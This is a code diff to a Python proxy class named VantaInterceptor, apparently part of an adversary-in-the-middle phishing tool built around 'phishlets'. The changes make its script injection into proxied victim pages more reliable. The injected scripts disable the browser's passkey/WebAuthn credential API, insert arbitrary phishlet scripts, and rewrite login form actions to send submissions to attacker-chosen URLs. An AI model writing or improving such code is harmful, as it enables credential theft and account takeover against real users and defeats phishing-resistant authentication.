@@ -284,18 +284,24 @@ class VantaInterceptor:
                         "if(navigator.credentials&&navigator.credentials.get){try{navigator.credentials.get=function(){return Promise.reject(new DOMException('Not supported','NotSupportedError'));};}catch(e){}}"
                         "}catch(e){}})();"
                     )
-                    flow.response.text = flow.response.text.replace(
-                        "</body>",
-                        f"<script>{js_bridge}</script></body>"
-                    )
+                    if "</body>" in flow.response.text:
+                        flow.response.text = flow.response.text.replace(
+                            "</body>",
+                            f"<script>{js_bridge}</script></body>"
+                        )
+                    else:
+                        flow.response.text = (flow.response.text or "") + f"<script>{js_bridge}</script>"
             except Exception:
                 pass
             for injection in self.phishlet.injections:
                 if injection.position == "body_end":
-                    flow.response.text = flow.response.text.replace(
-                        "</body>", 
-                        f"<script>{injection.content}</script></body>"
-                    )
+                    if "</body>" in flow.response.text:
+                        flow.response.text = flow.response.text.replace(
+                            "</body>", 
+                            f"<script>{injection.content}</script></body>"
+                        )
+                    else:
+                        flow.response.text = (flow.response.text or "") + f"<script>{injection.content}</script>"
             if getattr(self.phishlet, "form_actions", []):
                 parts = []
                 for r in self.phishlet.form_actions:
@@ -303,7 +309,10 @@ class VantaInterceptor:
                     act = r.action_to.replace("'", "\\'")
                     parts.append(f"document.querySelectorAll('{sel}').forEach(function(f){{try{{f.setAttribute('action','{act}')}}catch(e){{}}}});")
                 js = "(function(){try{" + "".join(parts) + "}catch(e){}})();"
-                flow.response.text = flow.response.text.replace(
-                    "</body>",
-                    f"<script>{js}</script></body>"
-                )
+                if "</body>" in flow.response.text:
+                    flow.response.text = flow.response.text.replace(
+                        "</body>",
+                        f"<script>{js}</script></body>"
+                    )
+                else:
+                    flow.response.text = (flow.response.text or "") + f"<script>{js}</script>"
